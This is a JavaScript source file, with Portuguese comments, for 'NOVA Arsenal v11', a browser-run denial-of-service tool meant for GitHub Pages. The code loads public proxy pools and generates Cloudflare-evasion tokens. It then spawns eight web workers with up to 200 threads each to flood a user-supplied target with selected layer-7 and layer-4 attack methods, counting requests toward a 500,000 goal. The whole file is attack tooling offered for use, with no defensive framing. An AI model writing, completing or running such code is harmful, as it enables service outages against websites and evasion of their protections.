// NOVA Arsenal v11 — GitHub Pages Edition
// 100% cliente, sem backend, proxies carregados diretamente do browser

class NovaEngine {
  constructor() {
    this.workers = [];
    this.proxies = [];
    this.cf = null;
    this.active = false;
    this.stats = { sent: 0, failed: 0, startTime: 0 };
    this.target = "";
    this.timerInterval = null;
    this.statsInterval = null;
    this.WORKER_COUNT = 8;
  }

  log(msg, type) {
    const t = document.getElementById("terminal");
    const line = document.createElement("div");
    line.className = "terminal-line";
    const time = new Date().toLocaleTimeString("en-US", { hour12: false, hour: "2-digit", minute: "2-digit", second: "2-digit" });
    const colors = { info: "term-info", warn: "term-warn", err: "term-err", ok: "term-ok" };
    line.innerHTML = '<span class="term-time">' + time + '</span><span class="' + (colors[type] || "term-info") + '">' + msg + "</span>";
    t.appendChild(line);
    t.scrollTop = t.scrollHeight;
  }

  async loadProxies() {
    this.log("Carregando pools de proxy...", "info");
    try {
      const result = await window.proxyLoader.loadAll();
      this.proxies = result.proxies || [];
      
      document.getElementById("dot-ps").className = "proxy-dot" + (result.sources.proxyscrape > 0 ? " online" : "");
      document.getElementById("dot-gn").className = "proxy-dot" + (result.sources.geonode > 0 ? " online" : "");
      document.getElementById("dot-pf").className = "proxy-dot" + (result.sources.proxifly > 0 ? " online" : "");
      
      document.getElementById("label-ps").textContent = "ProxyScrape (" + result.sources.proxyscrape + ")";
      document.getElementById("label-gn").textContent = "GeoNode (" + result.sources.geonode + ")";
      document.getElementById("label-pf").textContent = "Proxifly (" + result.sources.proxifly + ")";
      
      this.log(this.proxies.length + " proxies carregados", "ok");
      return this.proxies.length > 0;
    } catch (e) {
      this.log("Erro ao carregar proxies: " + e.message, "err");
      return false;
    }
  }

  getActiveMethods() {
    const l7 = Array.from(document.querySelectorAll("#l7-grid .method-chip.active")).map(function(el) { return el.dataset.m; });
    const l4 = Array.from(document.querySelectorAll("#l4-grid .method-chip.active")).map(function(el) { return el.dataset.m; });
    return l7.concat(l4);
  }

  async deploy() {
    if (this.active) return;
    
    this.target = document.getElementById("target").value.trim();
    if (!this.target) { this.log("Informe um alvo válido", "err"); return; }
    
    const intensity = document.getElementById("intensity").value;
    const threadsMap = { low: 10, medium: 50, high: 100, maximum: 200 };
    const threadsPerWorker = threadsMap[intensity] || 50;
    
    document.getElementById("btn-deploy").disabled = true;
    document.getElementById("btn-stop").disabled = false;
    
    this.log("Iniciando reconhecimento: " + this.target, "warn");
    
    const hasProxies = await this.loadProxies();
    if (!hasProxies) {
      this.log("Sem proxies disponíveis. Abortando.", "err");
      document.getElementById("btn-deploy").disabled = false;
      document.getElementById("btn-stop").disabled = true;
      return;
    }
    
    this.cf = window.cfEvasion.generate();
    
    const methods = this.getActiveMethods();
    if (methods.length === 0) { this.log("Selecione pelo menos um método", "warn"); return; }
    
    this.log("Deployando " + this.WORKER_COUNT + " workers × " + threadsPerWorker + " threads", "warn");
    this.log("Métodos: " + methods.join(", "), "info");
    
    this.active = true;
    this.stats = { sent: 0, failed: 0, startTime: Date.now() };
    this.workers = [];
    
    for (let i = 0; i < this.WORKER_COUNT; i++) {
      const w = new Worker("workers/storm-worker.js");
      w.postMessage({
        cmd: "init",
        config: { proxies: this.proxies, target: this.target, cfTokens: this.cf }
      });
      
      w.onmessage = function(e) {
        if (e.data.type === "stats") {
          this.stats.sent += e.data.sent || 0;
          this.stats.failed += e.data.failed || 0;
        }
      }.bind(this);
      
      this.workers.push(w);
    }
    
    await new Promise(function(r) { setTimeout(r, 500); });
    
    for (let i = 0; i < this.workers.length; i++) {
      this.workers[i].postMessage({
        cmd: "start",
        config: { methods: methods, threads: threadsPerWorker }
      });
    }
    
    this.log("STORM INICIADO — TODOS OS SISTEMAS ATIVOS", "ok");
    
    this.timerInterval = setInterval(function() {
      const elapsed = Math.floor((Date.now() - this.stats.startTime) / 1000);
      const m = Math.floor(elapsed / 60).toString().padStart(2, "0");
      const s = (elapsed % 60).toString().padStart(2, "0");
      document.getElementById("timer").textContent = m + ":" + s;
    }.bind(this), 1000);
    
    this.statsInterval = setInterval(function() { this.updateUI(); }.bind(this), 200);
  }

  updateUI() {
    const elapsed = (Date.now() - this.stats.startTime) / 1000;
    const rate = elapsed > 0 ? Math.floor(this.stats.sent / elapsed) : 0;
    
    const counter = document.getElementById("counter");
    const oldVal = parseInt(counter.textContent.replace(/,/g, "")) || 0;
    if (this.stats.sent !== oldVal) {
      counter.textContent = this.stats.sent.toLocaleString();
      counter.classList.add("pulse");
      setTimeout(function() { counter.classList.remove("pulse"); }, 100);
    }
    
    const target = 500000;
    const pct = Math.min((this.stats.sent / target) * 100, 100);
    const circumference = 2 * Math.PI * 90;
    const offset = circumference - (pct / 100) * circumference;
    document.getElementById("progress").style.strokeDashoffset = offset;
    document.getElementById("pct").textContent = Math.floor(pct) + "%";
    
    document.getElementById("rate").textContent = rate.toLocaleString() + "/s";
    document.getElementById("fails").textContent = this.stats.failed.toLocaleString();
    document.getElementById("workers").textContent = this.workers.length;
  }

  stop() {
    if (!this.active) return;
    this.active = false;
    
    for (let i = 0; i < this.workers.length; i++) {
      this.workers[i].postMessage({ cmd: "stop" });
    }
    
    clearInterval(this.timerInterval);
    clearInterval(this.statsInterval);
    
    this.log("Storm finalizado. Total: " + this.stats.sent.toLocaleString() + " requests", "ok");
    
    document.getElementById("btn-deploy").disabled = false;
    document.getElementById("btn-stop").disabled = true;
  }
}

document.querySelectorAll(".method-chip").forEach(function(chip) {
  chip.addEventListener("click", function() {
    this.classList.toggle("active");
  });
});

const particles = document.getElementById("particles");
for (let i = 0; i < 30; i++) {
  const p = document.createElement("div");
  p.className = "particle";
  p.style.left = Math.random() * 100 + "%";
  p.style.animationDelay = Math.random() * 15 + "s";
  p.style.animationDuration = (10 + Math.random() * 10) + "s";
  particles.appendChild(p);
}

const nova = new NovaEngine();
function deploy() { nova.deploy(); }
function stop() { nova.stop(); }
